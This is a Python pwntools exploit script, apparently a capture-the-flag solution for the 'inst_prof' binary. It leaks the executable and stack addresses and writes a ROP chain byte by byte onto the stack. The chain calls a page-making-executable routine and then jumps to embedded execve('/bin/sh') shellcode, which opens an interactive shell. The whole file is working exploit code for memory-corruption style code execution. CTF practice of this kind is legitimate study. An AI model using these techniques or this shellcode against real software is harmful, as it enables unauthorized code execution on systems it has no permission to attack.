from pwn import *

# Run process
context.arch = 'amd64'
context.terminal = ['tmux','new-window']
#context.aslr = None



r = process(['./inst_prof'])
#r = gdb.debug(['./patched'],
#        """
#        #b *0x555555554b16
#        #b *0x555555554b2d
#        #b *0x7fffffffe390
#        b *0x555555554bc3
#        continue 24
#        """
#)



r.settimeout(None)
          
            
def disable_alarm():
    r.send(asm("pop r13; push r13")    +
           asm("push 0x78; pop r14")   +
           asm("sub r13, r14; ret ")*7 +    #  sub r13, 0x348
           asm("jmp r13; ret")
    )
    r.recvn(8+8+8*7+8) # Clean buf
    





############ 1. Find out the position of the executable  ############
############ (we get the addr of the inst at 0x00000b18) ############


# Leak least significant bits addr executable
r.recvuntil("initializing prof...ready\n"); 
disable_alarm() ## OPTIONAL

r.send(asm("pop r13; push r13")  +  # r13 = return address
       asm("shl r13; ret")*0x20  +  # r13 << 0x20
       asm("sub r12, r13; ret")     # r12 = r13
)
r.recvn(8+8*0x20) # Clean buf
exe_addr = r.recvn(8)[4:]


# Leak most significant bits addr executable
r.send(asm("pop r13; push r13") +     # r13 = return address
       asm("sub r12, r13; ret")       # r12 = r13
)   
r.recvn(8) # Clean buf

exe_addr += r.recvn(8)[4:]
exe_addr = unpack(exe_addr)
log.info("Got exe_addr: %#x" % exe_addr)







############ 2. Find out the position of the stack ############

# Leak least significant bits base pointer
r.clean()
r.send(asm("mov r13, rbp; ret") +  # r13 = rsp
       asm("shl r13; ret")*0x20 +  # r13 << 0x20
       asm("sub r12, r13; ret")    # r12 = r13
)
r.recvn(8+8*0x20) # Clean buf
rbp = r.recvn(8)[4:]


# Leak most significant bits base pointer
r.clean()
r.send(asm("mov r13, rbp; ret") +   # r13 = rsp
       asm("sub r12, r13; ret")     # r12 = r13
)
r.recvn(8) # Clean buf
rbp += r.recvn(8)[4:]
rbp = unpack(rbp)
log.info("Got rbp: %#x" % rbp)








########## 3. Create a ropchain which will make the stack   
##########    executable and return to a shellcode on the stack


off_start_ropchain = 0x20   # Offset from rbp

shellcode = ("\x48\x81\xec\x00\x10\x00\x00" +                # sub rsp, 0x100
             "\x48\x31\xd2" +                                # xor    %rdx, %rdx
             "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" +    # mov  $0x68732f6e69622f2f, %rbx
             "\x48\xc1\xeb\x08" +                            # shr    $0x8, %rbx
             "\x53" +                                        # push   %rbx
             "\x48\x89\xe7" +                                # mov    %rsp, %rdi
             "\x50" +                                        # push   %rax
             "\x57" +                                        # push   %rdi
             "\x48\x89\xe6" +                                # mov    %rsp, %rsi
             "\xb0\x3b" +                                    # mov    $0x3b, %al
             "\x0f\x05"                                      # syscall
            )
                                         

def compute_addr(addr):
    global exe_addr
    offset = addr - 0xb18
    return exe_addr + offset

addr_shellcode = rbp + off_start_ropchain + 32
start_page     = addr_shellcode - (addr_shellcode % 0x1000) # So mprotect will not complain

ropchain = ( 
        pack(compute_addr(0xbc3))      +       # pop rdi; ret
        pack(start_page)               +       # <--- rdi 
        pack(compute_addr(0xa20))      +       # <make_page_executable>
        pack(addr_shellcode)           +       # address of the shellcode
        shellcode
)

# Write ropchain on the stack
r.send(asm("xor r13, r13; ret"))                      # r13 = 0

for i in range(len(ropchain)):
    byte = u8(ropchain[i])
    stack_addr = off_start_ropchain+i

    log.info("Writing %#x at addr %#x" % (byte, stack_addr))

    r.send(asm("movb r13b, %#x; ret" % byte) +        # r13 = ropchain[i]
           asm("movb [rbp+%#x], r13b" % stack_addr)   # rbp[i] = r13
    )


# Hook to the ropchain
r.send(
    asm("xor r13, r13; ret")  +                       # r13 = 0
    asm("movb r13b, %#x; ret" % 0x48) +               # r13 = 0x48 (offset from rsp and the ropchain)
    asm("add rsp, r13; ret")                          # rsp += r13
)


r.clean()
r.interactive()
